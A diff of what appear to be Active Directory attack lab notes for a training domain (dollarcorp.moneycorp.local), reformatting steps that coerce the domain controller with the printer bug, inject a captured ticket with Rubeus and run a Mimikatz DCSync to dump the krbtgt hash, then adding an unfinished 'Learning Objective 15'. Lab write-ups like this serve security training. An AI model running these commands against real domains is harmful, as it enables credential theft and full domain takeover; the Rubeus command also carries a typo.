@@ -272,18 +272,42 @@ Rubeus.exe monitor /interval:5 /nowrap
 MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
 
+***
 
 - If you are attacking from a Linux machine, check out Coercer - (https://github.com/p0dalirius/Coercer) - for other MS protocols that can be abused for coercion.
 
-
+***
 
 - Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
+
 
 ```powershell
 Rubeus.exe ptt /tikcet:
 ```
 
 
-- Once the ticket is injected, run DCSync:
-Invoke-Mimikatz -Command '"lsadump::dcsync
-/user:dcorp\krbtgt"'
+- Once the ticket is injected, run `DCSync`:
+
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+
+
+# **Learning Objective 15**
+
+
+- Find a server in dcorp domain where Unconstrained Delegation is enabled.
+- Compromise the server and escalate to Domain Admin privileges.
+- Escalate to Enterprise Admins privileges by abusing Printer Bug!
+
+
+## **Solution**
+
+
+
+**_Coming Soon_**
+
+
+
